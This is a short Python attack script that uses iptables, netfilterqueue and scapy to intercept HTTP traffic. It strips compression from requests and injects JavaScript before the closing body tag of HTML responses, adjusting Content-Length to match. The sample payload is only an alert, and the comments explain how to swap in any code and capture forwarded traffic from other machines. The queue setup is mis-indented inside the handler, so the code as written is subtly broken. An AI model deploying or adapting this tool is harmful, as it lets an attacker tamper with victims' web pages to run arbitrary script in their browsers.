#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

# use iptables to modifing routing rules to other computer use: 
# iptables -I FORWARD -j NFQUEUE --queue-num 0

# to test packets on local computer:
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0

# in the end use > iptables --flush
# TODO: use subprocess to do the iptables commands
# pip install netfilterqueue
# put the code on injection_code variable and the place to inject on the load.replace
# TODO: set optparce, to put only code injection

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            # print(scapy_packet.show())
            injection_code = "<script>alert('test');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))
        
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()